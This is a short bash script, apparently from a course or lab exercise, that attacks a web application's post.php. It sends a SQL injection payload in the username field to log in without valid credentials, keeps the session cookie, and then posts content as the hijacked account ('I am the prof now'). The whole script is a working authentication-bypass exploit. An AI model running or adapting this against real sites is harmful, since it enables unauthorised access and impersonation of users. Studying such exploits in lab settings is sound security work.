#!/bin/bash          

url=$1'/post.php'

curl -c cookies.txt $url --data 'username=%27+or+username+%21%3D+%27dstinson%27%3B&password=asdf&form=login&submit=Login'

echo "Just logged in as erinn"

curl -b cookies.txt $url --data 'title=Look+at+me&content=I+am+the+prof+now&type=1&form=content&submit=Post'

echo "Just posted as erin"



